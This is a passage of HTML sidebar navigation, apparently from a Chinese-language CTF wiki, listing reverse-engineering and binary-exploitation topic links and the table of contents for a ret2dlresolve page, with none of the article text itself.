md-toggle" data-md-toggle=nav-8-6 type=checkbox id=nav-8-6> <label class=md-nav__link for=nav-8-6> 虛擬機逆向 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=虛擬機逆向 data-md-level=2> <label class=md-nav__title for=nav-8-6> <span class="md-nav__icon md-icon"></span> 虛擬機逆向 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../reverse/vm/vm/ class=md-nav__link> 虛擬機分析 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-7 type=checkbox id=nav-8-7> <label class=md-nav__link for=nav-8-7> Platform related <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Platform related" data-md-level=2> <label class=md-nav__title for=nav-8-7> <span class="md-nav__icon md-icon"></span> Platform related </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-7-1 type=checkbox id=nav-8-7-1> <label class=md-nav__link for=nav-8-7-1> Linux Reverse <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Linux Reverse" data-md-level=3> <label class=md-nav__title for=nav-8-7-1> <span class="md-nav__icon md-icon"></span> Linux Reverse </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../reverse/platform/linux/ld_preload/ class=md-nav__link> LD_PRELOAD </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/platform/linux/false-disasm/ class=md-nav__link> False Disassembly </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/platform/linux/detect-bp/ class=md-nav__link> Detecting Breakpoints </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/platform/linux/detect-dbg/ class=md-nav__link> Detecting debugging </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-7-2 type=checkbox id=nav-8-7-2> <label class=md-nav__link for=nav-8-7-2> Windows Reverse <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Windows Reverse" data-md-level=3> <label class=md-nav__title for=nav-8-7-2> <span class="md-nav__icon md-icon"></span> Windows Reverse </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-7-2-1 type=checkbox id=nav-8-7-2-1> <label class=md-nav__link for=nav-8-7-2-1> 脫殼技術 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=脫殼技術 data-md-level=4> <label class=md-nav__title for=nav-8-7-2-1> <span class="md-nav__icon md-icon"></span> 脫殼技術 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../reverse/platform/windows/unpack/packer-introduction/ class=md-nav__link> 保護殼簡介 </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/platform/windows/unpack/trace/ class=md-nav__link> 單步跟蹤法 </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/platform/windows/unpack/esp/ class=md-nav__link> ESP 定律法 </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/platform/windows/unpack/direct-oep/ class=md-nav__link> 一步到達 OEP 法 </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/platform/windows/unpack/memory/ class=md-nav__link> 內存鏡像法 </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/platform/windows/unpack/last-exception/ class=md-nav__link> 最後一次異常法 </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/platform/windows/unpack/sfx/ class=md-nav__link> SFX 法 </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/platform/windows/unpack/fix-iat/ class=md-nav__link> DUMP 及 IAT 重建 </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/platform/windows/unpack/manually-fix-iat/ class=md-nav__link> 手動查找 IAT 並使用 ImportREC 重建 </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/platform/windows/unpack/unpack-dll/ class=md-nav__link> DLL 文件脫殼 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-7-2-2 type=checkbox id=nav-8-7-2-2> <label class=md-nav__link for=nav-8-7-2-2> 反調試技術 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=反調試技術 data-md-level=4> <label class=md-nav__title for=nav-8-7-2-2> <span class="md-nav__icon md-icon"></span> 反調試技術 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../reverse/platform/windows/anti-debug/ntglobalflag/ class=md-nav__link> NtGlobalFlag </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/platform/windows/anti-debug/heap-flags/ class=md-nav__link> Heap Flags </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/platform/windows/anti-debug/the-heap/ class=md-nav__link> The Heap </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/platform/windows/anti-debug/int-3/ class=md-nav__link> Interrupt 3 </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/platform/windows/anti-debug/isdebuggerpresent/ class=md-nav__link> IsDebuggerPresent </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/platform/windows/anti-debug/checkremotedebuggerpresent/ class=md-nav__link> CheckRemoteDebuggerPresent </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/platform/windows/anti-debug/ntqueryinformationprocess/ class=md-nav__link> NtQueryInformationProcess </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/platform/windows/anti-debug/zwsetinformationthread/ class=md-nav__link> ZwSetInformationThread </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/platform/windows/anti-debug/junk-code/ class=md-nav__link> 花指令 </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/platform/windows/anti-debug/example/ class=md-nav__link> 反調試技術例題 </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-8 type=checkbox id=nav-8-8> <label class=md-nav__link for=nav-8-8> Language related <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Language related" data-md-level=2> <label class=md-nav__title for=nav-8-8> <span class="md-nav__icon md-icon"></span> Language related </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../reverse/language/introduction/ class=md-nav__link> 簡介 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-8-2 type=checkbox id=nav-8-8-2> <label class=md-nav__link for=nav-8-8-2> Python <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Python data-md-level=3> <label class=md-nav__title for=nav-8-8-2> <span class="md-nav__icon md-icon"></span> Python </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../reverse/language/python/introduction/ class=md-nav__link> Python 逆向入門 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-8-3 type=checkbox id=nav-8-8-3> <label class=md-nav__link for=nav-8-8-3> Rust <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Rust data-md-level=3> <label class=md-nav__title for=nav-8-8-3> <span class="md-nav__icon md-icon"></span> Rust </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../reverse/language/rust/introduction/ class=md-nav__link> Rust 逆向入門 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-8-4 type=checkbox id=nav-8-8-4> <label class=md-nav__link for=nav-8-8-4> Golang <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Golang data-md-level=3> <label class=md-nav__title for=nav-8-8-4> <span class="md-nav__icon md-icon"></span> Golang </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../reverse/language/go/introduction/ class=md-nav__link> Golang 逆向入門 </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9 type=checkbox id=nav-9 checked> <label class=md-nav__link for=nav-9> Pwn <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Pwn data-md-level=1> <label class=md-nav__title for=nav-9> <span class="md-nav__icon md-icon"></span> Pwn </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1 type=checkbox id=nav-9-1 checked> <label class=md-nav__link for=nav-9-1> Linux Platform <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Linux Platform" data-md-level=2> <label class=md-nav__title for=nav-9-1> <span class="md-nav__icon md-icon"></span> Linux Platform </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1 type=checkbox id=nav-9-1-1 checked> <label class=md-nav__link for=nav-9-1-1> User Mode <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="User Mode" data-md-level=3> <label class=md-nav__title for=nav-9-1-1> <span class="md-nav__icon md-icon"></span> User Mode </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-1 type=checkbox id=nav-9-1-1-1> <label class=md-nav__link for=nav-9-1-1-1> Environment <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Environment data-md-level=4> <label class=md-nav__title for=nav-9-1-1-1> <span class="md-nav__icon md-icon"></span> Environment </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../environment/ class=md-nav__link> Environment </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2 type=checkbox id=nav-9-1-1-2 checked> <label class=md-nav__link for=nav-9-1-1-2> Exploitation <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Exploitation data-md-level=4> <label class=md-nav__title for=nav-9-1-1-2> <span class="md-nav__icon md-icon"></span> Exploitation </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-1 type=checkbox id=nav-9-1-1-2-1 checked> <label class=md-nav__link for=nav-9-1-1-2-1> Stack Overflow <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Stack Overflow" data-md-level=5> <label class=md-nav__title for=nav-9-1-1-2-1> <span class="md-nav__icon md-icon"></span> Stack Overflow </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-1-1 type=checkbox id=nav-9-1-1-2-1-1 checked> <label class=md-nav__link for=nav-9-1-1-2-1-1> x86 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=x86 data-md-level=6> <label class=md-nav__title for=nav-9-1-1-2-1-1> <span class="md-nav__icon md-icon"></span> x86 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../stack-intro/ class=md-nav__link> 棧介紹 </a> </li> <li class=md-nav__item> <a href=../../stackoverflow-basic/ class=md-nav__link> 棧溢出原理 </a> </li> <li class=md-nav__item> <a href=../../basic-rop/ class=md-nav__link> 基本 ROP </a> </li> <li class=md-nav__item> <a href=../../medium-rop/ class=md-nav__link> 中級ROP </a> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-1-1-5 type=checkbox id=nav-9-1-1-2-1-1-5 checked> <label class=md-nav__link for=nav-9-1-1-2-1-1-5> 高級 ROP <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="高級 ROP" data-md-level=7> <label class=md-nav__title for=nav-9-1-1-2-1-1-5> <span class="md-nav__icon md-icon"></span> 高級 ROP </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../advanced-rop/ class=md-nav__link> 高級 ROP </a> </li> <li class="md-nav__item md-nav__item--active"> <input class="md-nav__toggle md-toggle" data-md-toggle=toc type=checkbox id=__toc> <label class="md-nav__link md-nav__link--active" for=__toc> ret2dlresolve <span class="md-nav__icon md-icon"></span> </label> <a href=./ class="md-nav__link md-nav__link--active"> ret2dlresolve </a> <nav class="md-nav md-nav--secondary" aria-label=目录> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> 目录 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=#_1 class=md-nav__link> 原理 </a> <nav class=md-nav aria-label=原理> <ul class=md-nav__list> <li class=md-nav__item> <a href=#1- class=md-nav__link> 思路1 - 直接控制重定位表項的相關內容 </a> </li> <li class=md-nav__item> <a href=#2- class=md-nav__link> 思路2 - 間接控制重定位表項的相關內容 </a> </li> <li class=md-nav__item> <a href=#3-link_map class=md-nav__link> 思路3 - 僞造 link_map </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#32 class=md-nav__link> 32 位例子 </a> <nav class=md-nav aria-label="32 位例子"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#no-relro class=md-nav__link> NO RELRO </a> </li> <li class=md-nav__item> <a href=#partial-relro class=md-nav__link> Partial RELRO </a> <nav class=md-nav aria-label="Partial RELRO"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_2 class=md-nav__link> 手工僞造 </a> <nav class=md-nav aria-label=手工僞造> <ul class=md-nav__list> <li class=md-nav__item> <a href=#stage-1 class=md-nav__link> stage 1 </a> </li> <li class=md-nav__item> <a href=#stage-2 class=md-nav__link> stage 2 </a> </li> <li class=md-nav__item> <a href=#stage-3 class=md-nav__link> stage 3 </a> </li> <li class=md-nav__item> <a href=#stage-4 class=md-nav__link> stage 4 </a> </li> <li class=md-nav__item> <a href=#stage-5 class=md-nav__link> stage 5 </a> </li> <li class=md-nav__item> <a href=#stage-6 class=md-nav__link> stage 6 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#_3 class=md-nav__link> 基於工具僞造 </a> <nav class=md-nav aria-label=基於工具僞造> <ul class=md-nav__list> <li class=md-nav__item> <a href=#roputil class=md-nav__link> Roputil </a> </li> <li class=md-nav__item> <a href=#pwntools class=md-nav__link> pwntools </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#full-relro class=md-nav__link> Full RELRO </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#64 class=md-nav__link> 64 位例子 </a> <nav class=md-nav aria-label="64 位例子"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#no-relro_1 class=md-nav__link> NO RELRO </a> </li> <li class=md-nav__item> <a href=#partial-relro_1 class=md-nav__link> Partial RELRO </a> <nav class=md-nav aria-label="Partial RELRO"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_4 class=md-nav__link> 手工僞造 </a> <nav class=md-nav aria-label=手工僞造> <ul class=md-nav__list> <li class=md-nav__item> <a href=#64_1 class=md-nav__link> 64 位的變化 </a> </li> <li class=md-nav__item> <a href=#first-try-leak class=md-nav__link> First Try - leak </a> </li> <li class=md-nav__item> <a href=#second-try-no-leak class=md-nav__link> Second try - no leak </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#_5 class=md-nav__link> 基於工具僞造 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#full-relro_1 class=md-nav__link> Full RELRO </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#2015-hitcon-readable class=md-nav__link> 2015-hitcon-readable </a> <nav class=md-nav aria-label=2015-hitcon-readable> <ul class=md-nav__list> <li class=md-nav__item> <a href=#1modify-dynamic-section class=md-nav__link> 方法1：modify dynamic section </a> </li> <li class=md-nav__item> <a href=#2-rop class=md-nav__link> 方法 2 - 標準 ROP </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#2015-hitcon-quals-blinkroot class=md-nav__link> 2015-hitcon-quals-blinkroot </a> </li> <li class=md-nav__item> <a href=#_6 class=md-nav__link> 總結 </a> </li> <li class=md-nav__item> <a href=#_7 class=md-nav__link> 題目 </a> </li> <li class=md-nav__item> <a href=#_8 class=md-nav__link> 參考 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../ret2vdso/ class=md-nav__link> ret2VDSO </a> </li> <li class=md-nav__item> <a href=../srop/ class=md-nav__link> SROP </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-1-1-6 type=checkbox id=nav-9-1-1-2-1-1-6> <label class=md-nav__link for=nav-9-1-1-2-1-1-6> 花式棧溢出 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=花式棧溢出 data-md-level=7> <label class=md-nav__title for=nav-9-1-1-2-1-1-6> <span class="md-nav__icon md-icon"></span> 花式棧溢出 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../fancy-rop/ class=md-nav__link> 花式棧溢出技巧 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-1-2 type=checkbox id=nav-9-1-1-2-1-2> <label class=md-nav__link for=nav-9-1-1-2-1-2> arm <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=arm data-md-level=6> <label class=md-nav__title for=nav-9-1-1-2-1-2> <span class="md-nav__icon md-icon"></span> arm </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../arm/environment/ class=md-nav__link> 環境搭建 </a> </li> <li class=md-nav__item> <a href=../../../arm/rop/ class=md-nav__link> Arm ROP </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-1-3 type=checkbox id=nav-9-1-1-2-1-3> <label class=md-nav__link for=nav-9-1-1-2-1-3> mips <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=mips data-md-level=6> <label class=md-nav__title for=nav-9-1-1-2-1-3> <span class="md-nav__icon md-icon"></span> mips </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../mips/rop/ class=md-nav__link> mips - ROP </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-1-4 type=checkbox id=nav-9-1-1-2-1-4> <label class=md-nav__link for=nav-9-1-1-2-1-4> risc-v <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=risc-v data-md-level=6> <label class=md-nav__title for=nav-9-1-1-2-1-4> <span class="md-nav__icon md-icon"></span> risc-v </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../risc-v/readme/ class=md-nav__link> RISC-V </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-2 type=checkbox id=nav-9-1-1-2-2> <label class=md-nav__link for=nav-9-1-1-2-2> Format String <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Format String" data-md-level=5> <label class=md-nav__title for=nav-9-1-1-2-2> <span class="md-nav__icon md-icon"></span> Format String </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../fmtstr/fmtstr-intro/ class=md-nav__link> 原理介紹 </a> </li> <li class=md-nav__item> <a href=../../../../fmtstr/fmtstr-exploit/ class=md-nav__link> 利用 </a> </li> <li class=md-nav__item> <a href=../../../../fmtstr/fmtstr-example/ class=md-nav__link> 例子 </a> </li> <li class=md-nav__item> <a href=../../../../fmtstr/fmtstr-detect/ class=md-nav__link> 檢測 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-3 type=checkbox id=nav-9-1-1-2-3> <label class=md-nav__link for=nav-9-1-1-2-3> Heap Exploitation <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Heap Exploitation" data-md-level=5> <label class=md-nav__title for=nav-9-1-1-2-3> <span class="md-nav__icon md-icon"></span> Heap Exploitation </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-3-1 type=checkbox id=nav-9-1-1-2-3-1> <label class=md-nav__link for=nav-9-1-1-2-3-1> Ptmalloc2 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Ptmalloc2 data-md-level=6> <label class=md-nav__title for=nav-9-1-1-2-3-1> <span class="md-nav__icon md-icon"></span> Ptmalloc2 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../heap/ptmalloc2/introduction/ class=md-nav__link> 堆利用 </a> </li> <li class=md-nav__item> <a href=../../../../heap/ptmalloc2/heap-overview/ class=md-nav__link> 堆概述 </a> </li> <li class=md-nav__item> <a href=../../../../heap/ptmalloc2/heap-structure/ class=md-nav__link> 堆相關數據結構 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-3-1-4 type=checkbox id=nav-9-1-1-2-3-1-4> <label class=md-nav__link for=nav-9-1-1-2-3-1-4> 深入理解 Ptmalloc2 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="深入理解 Ptmalloc2" data-md-level=7> <label class=md-nav__title for=nav-9-1-1-2-3-1-4> <span class="md-nav__icon md-icon"></span> 深入理解 Ptmalloc2 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../heap/ptmalloc2/implementation/overview/ class=md-nav__link> 深入理解堆的實現 </a> </li> <li class=md-nav__item> <a href=../../../../heap/ptmalloc2/implementation/basic/ class=md-nav__link> 基礎操作 </a> </li> <li class=md-nav__item> <a href=../../../../heap/ptmalloc2/implementation/heap-init/ class=md-nav__link> 堆初始化 </a> </li> <li class=md-nav__item> <a href=../../../../heap/ptmalloc2/implementation/malloc/ class=md-nav__link> 申請內存塊 </a> </li> <li class=md-nav__item> <a href=../../../../heap/ptmalloc2/implementation/free/ class=md-nav__link> 釋放內存塊 </a> </li> <li class=md-nav__item> <a href=../../../../heap/ptmalloc2/implementation/tcache/ class=md-nav__link> tcache </a> </li> <li class=md-nav__item> <a href=../../../../heap/ptmalloc2/implementation/malloc-state/ class=md-nav__link> malloc_state 相關函數 </a> </li> <li class=md-nav__item> <a href=../../../../heap/ptmalloc2/implementation/misc/ class=md-nav__link> 測試支持 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../../heap/ptmalloc2/heapoverflow-basic/ class=md-nav__link> 堆溢出 </a> </li> <li class=md-nav__item> <a href=../../../../heap/ptmalloc2/off-by-one/ class=md-nav__link> 堆中的 Off-By-One </a> </li> <li class=md-nav__item> <a href=../../../../heap/ptmalloc2/chunk-extend-overlapping/ class=md-nav__link> Chunk Extend and Overlapping </a> </li> <li class=md-nav__item> <a href=../../../../heap/ptmalloc2/unlink/ class=md-nav__link> Unlink </a> </li> <li class=md-nav__item> <a href=../../../../heap/ptmalloc2/use-after-free/ class=md-nav__link> Use After Free </a> </li> <li class=md-nav__item> <a href=../../../../heap/ptmalloc2/fastbin-attack/ class=md-nav__link> Fastbin Attack </a> </li> <li class=md-nav__item> <a href=../../../../heap/ptmalloc2/unsorted-bin-attack/ class=md-nav__link> Unsorted Bin Attack </a> </li> <li class=md-nav__item> <a href=../../../../heap/ptmalloc2/large-bin-attack/ class=md-nav__link> Large Bin Attack </a> </li> <li class=md-nav__item> <a href=../../../../heap/ptmalloc2/tcache-attack/ class=md-nav__link> Tcache attack </a> </li> <li class=md-nav__item> <a href=../../../../heap/ptmalloc2/house-of-einherjar/ class=md-nav__link> House Of Einherjar </a> </li> <li class=md-nav__item> <a href=../../../../heap/ptmalloc2/house-of-force/ class=md-nav__link> House Of Force </a> </li> <li class=md-nav__item> <a href=../../../../heap/ptmalloc2/house-of-lore/ class=md-nav__link> House of Lore </a> </li> <li class=md-nav__item> <a href=../../../../heap/ptmalloc2/house-of-orange/ class=md-nav__link> House of Orange </a> </li> <li class=md-nav__item> <a href=../../../../heap/ptmalloc2/house-of-rabbit/ class=md-nav__link> House of Rabbit </a> </li> <li class=md-nav__item> <a href=../../../../heap/ptmalloc2/house-of-roman/ class=md-nav__link> House of Roman </a> </li> <li class=md-nav__item> <a href=../../../../heap/ptmalloc2/house-of-pig/ class=md-nav__link> House of Pig </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-3-2 type=checkbox id=nav-9-1-1-2-3-2> <label class=md-nav__link for=nav-9-1-1-2-3-2> Musl-mallocng <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Musl-mallocng data-md-level=6> <label class=md-nav__title for=nav-9-1-1-2-3-2> <span class="md-nav__icon md-icon"></span> Musl-mallocng </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../heap/mallocng/readme/ class=md-nav__link> Readme </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-4 type=checkbox id=nav-9-1-1-2-4> <label class=md-nav__link for=nav-9-1-1-2-4> IO_FILE Exploitation <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="IO_FILE Exploitation" data-md-level=5> <label class=md-nav__title for=nav-9-1-1-2-4> <span class="md-nav__icon md-icon"></span> IO_FILE Exploitation </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../io-file/introduction/ class=md-nav__link> FILE結構 </a> </li> <li class=md-nav__item> <a href=../../../../io-file/fake-vtable-exploit/ class=md-nav__link> 僞造vtable劫持程序流程 </a> </li> <li class=md-nav__item> <a href=../../../../io-file/fsop/ class=md-nav__link> FSOP </a> </li> <li class=md-nav__item> <a href=../../../../io-file/exploit-in-libc2.24/ class=md-nav__link> glibc 2.24下 IO_FILE 的利用 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-5 type=checkbox id=nav-9-1-1-2-5> <label class=md-nav__link for=nav-9-1-1-2-5> Integer Overflow <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Integer Overflow" data-md-level=5> <label class=md-nav__title for=nav-9-1-1-2-5> <span class="md-nav__icon md-icon"></span> Integer Overflow </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../integeroverflow/introduction/ class=md-nav__link> 整數溢出 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-6 type=checkbox id=nav-9-1-1-2-6> <label class=md-nav__link for=nav-9-1-1-2-6> Type Confusion <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Type Confusion" data-md-level=5> <label class=md-nav__title for=nav-9-1-1-2-6> <span class="md-nav__icon md-icon"></span> Type Confusion </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../type-confusion/readme/ class=md-nav__link> Type Confusion </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-7 type=checkbox id=nav-9-1-1-2-7> <label class=md-nav__link for=nav-9-1-1-2-7> Uninitialized Memory <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Uninitialized Memory" data-md-level=5> <label class=md-nav__title for=nav-9-1-1-2-7> <span class="md-nav__icon md-icon"></span> Uninitialized Memory </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../uninitialized-memory/readme/ class=md-nav__link> Uninitialized Memory </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-8 type=checkbox id=nav-9-1-1-2-8> <label class=md-nav__link for=nav-9-1-1-2-8> Race Condition <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Race Condition" data-md-level=5> <label class=md-nav__title for=nav-9-1-1-2-8> <span class="md-nav__icon md-icon"></span> Race Condition </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../race-condition/introduction/ class=md-nav__link> Race Condition </a> </li> <li class=md-nav__item> <a href=../../../../race-condition/problem/ class=md-nav__link> 題目 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-3 type=checkbox id=nav-9-1-1-3> <label class=md-nav__link for=nav-9-1-1-3> Defense <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Defense data-md-level=4> <label class=md-nav__title for=nav-9-1-1-3> <span class="md-nav__icon md-icon"></span> 